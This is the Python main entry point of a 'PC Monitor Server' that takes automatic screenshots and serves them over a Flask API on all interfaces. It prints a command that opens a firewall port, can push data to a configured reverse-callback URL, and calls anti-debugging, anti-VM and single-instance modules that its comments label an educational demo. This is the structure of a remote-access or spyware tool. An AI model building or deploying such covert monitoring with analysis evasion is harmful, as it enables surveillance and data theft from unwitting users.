"""
PC Monitor Server - Main Entry Point
Refactored modular architecture
"""

import sys
import signal
import threading
from pathlib import Path

# Import configuration first
from server_modules.config import config, API_KEY, pc_id, DATA_DIR, SCREENSHOTS_DIR, OFFLINE_LOGS_DIR
from server_modules.utils import get_local_ip, get_all_local_ips

# Import core modules
from server_modules.monitoring import (
    start_monitoring, 
    stop_monitoring,
    auto_screenshot_thread,
    monitoring
)
from server_modules.api_routes import app
from server_modules.reverse_connection import ReverseConnection, load_callback_config

# Import evasion modules (safe demonstrations)
from evasion_modules.mutex import check_single_instance
from evasion_modules.anti_debug import check_debugging_environment
from evasion_modules.anti_vm import check_virtual_environment

def print_banner():
    """Display startup banner with connection information"""
    primary_ip = get_local_ip()
    all_ips = get_all_local_ips()
    port = config['port']
    
    print("="*70)
    print("PC MONITOR SERVER - Enhanced Edition")
    print("="*70)
    print(f"\nPC ID: {pc_id}")
    print(f"PC Name: {config.get('pc_name', 'Unknown')}")
    print(f"API Key: {API_KEY}")
    print(f"\nPort: {port}")
    print(f"Binding: {config['host']} (all interfaces)")
    
    print(f"\n{'-'*70}")
    print("CONNECTION INFORMATION")
    print(f"{'-'*70}")
    
    if primary_ip and primary_ip != "0.0.0.0":
        print(f"\n✓ Primary IPv4 Address: {primary_ip}")
        print(f"\n  Connect from remote client using:")
        print(f"  → http://{primary_ip}:{port}")
    
    if all_ips and len(all_ips) > 1:
        print(f"\n  Additional IP addresses detected:")
        for ip in all_ips:
            if ip != primary_ip:
                print(f"  → http://{ip}:{port}")
    
    print(f"\n  From this PC (localhost):")
    print(f"  → http://127.0.0.1:{port}")
    print(f"  → http://localhost:{port}")
    
    print(f"\n{'-'*70}")
    print("CLIENT CONFIGURATION")
    print(f"{'-'*70}")
    
    if primary_ip and primary_ip != "0.0.0.0":
        print(f'\nCopy this to your client_config.json:')
        print(f'{{')
        print(f'    "server_url": "http://{primary_ip}:{port}",')
        print(f'    "api_key": "{API_KEY}"')
        print(f'}}')
    
    print(f"\n{'-'*70}")
    print("FIREWALL REMINDER")
    print(f"{'-'*70}")
    print(f"\nIf connecting remotely, allow port {port} in firewall:")
    print(f"Run as Administrator:")
    print(f'  netsh advfirewall firewall add rule name="PC Monitor" dir=in action=allow protocol=TCP localport={port}')
    
    print(f"\n{'-'*70}")
    print(f"\nData directory: {DATA_DIR.absolute()}")
    print(f"Screenshots: {SCREENSHOTS_DIR.absolute()}")


def check_environment():
    """
    Perform environment checks (educational demonstration)
    This shows awareness of analysis evasion without deep implementation
    """
    print(f"\n{'-'*70}")
    print("ENVIRONMENT CHECKS (Educational Demo)")
    print(f"{'-'*70}")
    
    # Check for single instance
    print("\n[*] Checking for existing instances...")
    if not check_single_instance():
        print("    ⚠ Another instance may be running")
    else:
        print("    ✓ Single instance verified")
    
    # Check for debugging
    print("\n[*] Checking debugging environment...")
    debug_info = check_debugging_environment()
    if debug_info['is_being_debugged']:
        print("    ⚠ Debugger detected (demonstration mode - continuing anyway)")
        for check, result in debug_info.items():
            if result and check != 'is_being_debugged':
                print(f"      - {check}: {result}")
    else:
        print("    ✓ No debugger detected")
    
    # Check for virtualization
    print("\n[*] Checking virtual environment...")
    vm_info = check_virtual_environment()
    if vm_info['is_virtual']:
        print("    ⚠ Virtual machine detected (demonstration mode - continuing anyway)")
        print(f"      - Vendor: {vm_info.get('vendor', 'Unknown')}")
        for check, result in vm_info.items():
            if result and check not in ['is_virtual', 'vendor']:
                print(f"      - {check}: {result}")
    else:
        print("    ✓ Physical machine detected")
    
    print(f"\n{'-'*70}")
    print("NOTE: These checks are for EDUCATIONAL DEMONSTRATION only.")
    print("In this demo, execution continues regardless of detection.")
    print(f"{'-'*70}\n")


def setup_signal_handlers():
    """Setup graceful shutdown handlers"""
    def signal_handler(sig, frame):
        print("\n\nReceived shutdown signal...")
        stop_monitoring()
        sys.exit(0)
    
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)


def main():
    """Main entry point"""
    # Setup signal handlers
    setup_signal_handlers()
    
    # Perform environment checks (educational)
    check_environment()
    
    # Print startup banner
    print_banner()
    
    # Check for reverse connection config
    callback_config = load_callback_config()
    if callback_config.get('enabled'):
        print(f"\n{'-'*70}")
        print("REVERSE CONNECTION")
        print(f"{'-'*70}")
        print(f"Status: ENABLED")
        print(f"Callback URL: {callback_config.get('callback_url')}")
        print(f"Interval: {callback_config.get('interval')}s")
        print("Server will push data to client automatically")
    
    print("="*70)
    print("\nServer starting... Press Ctrl+C to stop")
    print("="*70 + "\n")
    
    # Start background threads
    screenshot_thread = threading.Thread(target=auto_screenshot_thread, daemon=True)
    screenshot_thread.start()
    
    # Start reverse connection if configured
    reverse_conn = None
    if callback_config.get('enabled'):
        reverse_conn = ReverseConnection(callback_config)
        reverse_conn.start()
    
    # Start Flask server
    try:
        app.run(
            host=config['host'],
            port=config['port'],
            debug=False,
            threaded=True
        )
    except KeyboardInterrupt:
        print("\n\nServer stopped by user")
        stop_monitoring()
        if reverse_conn:
            reverse_conn.stop()
        sys.exit(0)


if __name__ == '__main__':
    # Check if running as a service
    if len(sys.argv) > 1 and sys.argv[1].lower() in ['install', 'remove', 'start', 'stop', 'restart', 'status']:
        print(f"Service command '{sys.argv[1]}' detected.")
        print("Note: Service installation requires install_service.py module")
        print("Run the server normally without arguments to start monitoring")
        sys.exit(1)
    else:
        main()